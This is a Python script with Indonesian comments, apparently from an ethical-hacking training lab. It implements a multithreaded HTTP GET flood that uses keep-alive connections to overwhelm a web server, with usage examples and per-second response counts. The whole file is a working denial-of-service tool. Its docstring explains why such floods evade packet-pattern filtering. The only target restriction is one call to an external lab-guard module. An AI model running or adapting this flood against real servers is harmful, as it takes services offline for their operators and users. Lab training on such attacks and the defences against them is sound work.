#!/usr/bin/env python3
"""HTTP flood sederhana. Membanjiri target dengan permintaan GET yang sah.

Pemakaian:
    python3 http-flood.py <target> [jumlah_utas] [durasi_detik] [jalur]

Contoh:
    python3 /lab/serang/http-flood.py web 60 30
    python3 /lab/serang/http-flood.py web 40 20 /laporan.bin

Bedanya dengan slowloris: di sini setiap permintaan lengkap dan wajar. Yang
membunuh server bukan bentuk paketnya, tapi jumlahnya. Karena tiap permintaan
sah, penyaringan berbasis pola paket tidak menolong, dan itu sebabnya
pertahanan terhadap flood berada di lapisan yang berbeda: pembatasan jumlah
permintaan, antrean, dan kapasitas di depan.

Skrip ini memakai keep-alive supaya satu utas bisa menahan satu koneksi
sambil terus meminta. Angka yang dilaporkan tiap detik adalah jumlah respons
yang benar-benar diterima, bukan jumlah permintaan yang dikirim.
"""

import socket
import sys
import threading
import time

sys.path.insert(0, "/lab/serang")
from pagar import pastikan_target_lab  # noqa: E402

PORT = 80
berhenti = threading.Event()
kunci = threading.Lock()
hitung = {"ok": 0, "gagal": 0}


def baca_respons(s):
    """Baca satu respons HTTP sampai habis. Kembalikan False kalau koneksi
    ditutup di tengah jalan."""
    buf = b""
    while b"\r\n\r\n" not in buf:
        potongan = s.recv(8192)
        if not potongan:
            return False
        buf += potongan
    kepala, badan = buf.split(b"\r\n\r\n", 1)
    panjang = 0
    for baris in kepala.split(b"\r\n"):
        if baris.lower().startswith(b"content-length:"):
            panjang = int(baris.split(b":", 1)[1].strip())
            break
    sisa = panjang - len(badan)
    while sisa > 0:
        potongan = s.recv(min(65536, sisa))
        if not potongan:
            return False
        sisa -= len(potongan)
    return True


def pekerja(ip, nama, jalur):
    permintaan = (
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (lab CEH 07)\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ) % (jalur, nama)
    data = permintaan.encode("ascii")
    s = None
    while not berhenti.is_set():
        try:
            if s is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((ip, PORT))
            s.sendall(data)
            # Seluruh respons harus dibaca sampai habis. Kalau tidak, badan
            # respons menumpuk di buffer dan permintaan berikutnya di koneksi
            # yang sama akan salah dibaca. Ini juga yang bikin permintaan ke
            # berkas besar jadi mahal untuk penyerang, bukan cuma untuk target.
            if not baca_respons(s):
                raise OSError("koneksi ditutup server")
            with kunci:
                hitung["ok"] += 1
        except OSError:
            with kunci:
                hitung["gagal"] += 1
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
                s = None
            time.sleep(0.05)
    if s is not None:
        try:
            s.close()
        except OSError:
            pass


def main():
    nama = sys.argv[1] if len(sys.argv) > 1 else "web"
    utas = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    durasi = float(sys.argv[3]) if len(sys.argv) > 3 else 30.0
    jalur = sys.argv[4] if len(sys.argv) > 4 else "/"

    ip, subnet = pastikan_target_lab(nama)
    print("target  : %s (%s) port %d" % (nama, ip, PORT))
    print("subnet  : %s, dalam jaringan lab, boleh diserang" % subnet)
    print("jalur   : %s" % jalur)
    print("rencana : %d utas selama %.0f detik\n" % (utas, durasi))

    daftar = []
    for _ in range(utas):
        t = threading.Thread(target=pekerja, args=(ip, nama, jalur),
                             daemon=True)
        t.start()
        daftar.append(t)

    mulai = time.time()
    lalu_ok = 0
    lalu_gagal = 0
    try:
        while time.time() - mulai < durasi:
            time.sleep(1.0)
            with kunci:
                ok = hitung["ok"]
                gagal = hitung["gagal"]
            print("detik %-3d respons/detik: %-6d gagal/detik: %-6d"
                  % (int(time.time() - mulai), ok - lalu_ok, gagal - lalu_gagal))
            lalu_ok = ok
            lalu_gagal = gagal
    except KeyboardInterrupt:
        pass

    berhenti.set()
    for t in daftar:
        t.join(timeout=2)
    print("\ntotal respons diterima : %d" % hitung["ok"])
    print("total koneksi gagal    : %d" % hitung["gagal"])


if __name__ == "__main__":
    main()
